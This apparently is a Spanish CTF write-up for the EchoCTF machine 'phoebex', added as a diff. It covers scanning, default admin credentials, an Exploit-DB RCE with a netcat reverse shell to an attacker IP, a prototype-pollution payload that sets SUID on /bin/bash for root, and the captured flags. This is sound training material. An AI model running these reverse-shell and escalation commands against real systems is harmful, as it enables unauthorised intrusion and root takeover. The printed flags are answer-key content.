@@ -1,1 +1,185 @@
+# WriteUp — phoebex (EchoCTF)
+
+## Configuración inicial
+
+Agregar la siguiente línea a tu `/etc/hosts`:
+
+```
+10.0.160.231     phobex.echocity-f.com
+```
+
+```bash
+echo "10.0.160.231     phobex.echocity-f.com" | sudo tee -a /etc/hosts
+```
+
+## Reconocimiento
+
+### Escaneo rápido con RustScan
+
+```bash
+rustscan -a 10.0.160.231
+```
+
+```
+Open 10.0.160.231:22
+Open 10.0.160.231:80
+```
+
+### Escaneo completo con Nmap
+
+```bash
+nmap -Pn -sS -p- --min-rate 1000 --max-retries 1 10.0.160.231
+```
+
+**Puertos abiertos:**
+- `22/tcp` — SSH
+- `80/tcp` — HTTP
+
+## Enumeración Web
+
+Al inspeccionar el sitio web, se encuentra un panel de administración en:
+
+```
+http://phobex.echocity-f.com/admin
+```
+
+Las credenciales por defecto son:
+- **User:** `admin`
+- **Password:** `password123`
+
+## Explotación (Exploit-DB #51957)
+
+Se identifica una vulnerabilidad de **Remote Code Execution** en el panel de administración.
+
+### 1. Descargar el exploit
+
+```bash
+wget https://www.exploit-db.com/raw/51957 -O exploit.py
+```
+
+### 2. Iniciar listener
+
+```bash
+nc -lvnp 2222
+```
+
+### 3. Ejecutar el exploit
+
+```bash
+python3 exploit.py http://phobex.echocity-f.com/ admin password123 "nc -e /bin/bash 10.10.0.66 2222"
+```
+
+### 4. Obtener shell
+
+```
+listening on [any] 2222 ...
+connect to [10.10.0.66] from (UNKNOWN) [10.0.160.231] 38810
+```
+
+```bash
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+### 5. Estabilizar la shell
+
+```bash
+script /dev/null -qc bash
+^Z
+stty raw -echo; fg
+reset xterm
+```
+
+---
+
+## Escalada de Privilegios
+
+### 1. Verificar permisos sudo
+
+```bash
+sudo -l
+```
+
+```
+User www-data may run the following commands on phobex:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/obex
+```
+
+### 2. Analizar el binario
+
+```bash
+cat /usr/local/bin/obex
+```
+
+```javascript
+#! /usr/bin/env node
+var args = process.argv.slice(2);
+const { exec } = require('child_process');
+
+(async () => {
+  const lib = await import('@almela/obx');
+  var USER_JSON = JSON.parse(args[0]);
+  var user={
+    'username': "root"
+  };
+  try {
+    lib.add (user, USER_JSON)
+  } catch (e) { }
+  var newUser={}
+  if(newUser.authenticated==true)
+  {
+    exec(newUser.command);
+  }
+})();
+```
+
+**Vulnerabilidad:** El script utiliza `JSON.parse` para procesar input del usuario y luego usa `lib.add()` (biblioteca `@almela/obx`) que es vulnerable a **Prototype Pollution**. Al contaminar el prototype con `authenticated: true` y un `command`, se logra ejecución de comandos como root.
+
+### 3. Explotar Prototype Pollution
+
+```bash
+sudo /usr/local/bin/obex '{"__proto__":{"authenticated": true, "command": "chmod +s /bin/bash"}}'
+```
+
+Esto le da permisos SUID a `/bin/bash`.
+
+### 4. Obtener root
+
+```bash
+/bin/bash -p
+```
+
+```bash
+bash-5.2# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+```
+
+---
+
+## Búsqueda de Flags
+
+```bash
+echo -e "\x1b[33mSi tarda mucho, excluye el directorio lib.\x1b[0m" ; cd / && grep -rl --exclude-dir={proc,dev} -i 'etsctf_[0-9a-f]\{1,\}' 2>/dev/null | xargs -r strings | cat - <(strings /proc/*/environ 2>/dev/null) <(find / -iname 'etsctf_*' 2>/dev/null) | grep -oPi '(?<![A-Za-z0-9])ETSCTF_[0-9A-Fa-f]+' | grep -vFx "ETSCTF_F" | sort -u
+```
+
+### Flags encontradas:
+
+```
+ETSCTF_14e6e191cad29da2a89e7406f033dcd5
+ETSCTF_1a203caba65d0c293ab5c9aa2b7a1d6d
+ETSCTF_cb3192a104c4f5d75297256b3c1ce7ee
+ETSCTF_e6de43de779c323c98d459855566af96
+```
+
+---
+
+## Resumen
+
+| Paso | Técnica |
+|------|---------|
+| Reconocimiento | Nmap — puertos 22, 80 |
+| Enumeración | Panel `/admin` con credenciales default |
+| Explotación | Exploit-DB #51957 — RCE en panel admin |
+| Escalada | Prototype Pollution en `/usr/local/bin/obex` (Node.js) |
+| Root | SUID en `/bin/bash` → `/bin/bash -p` |
 
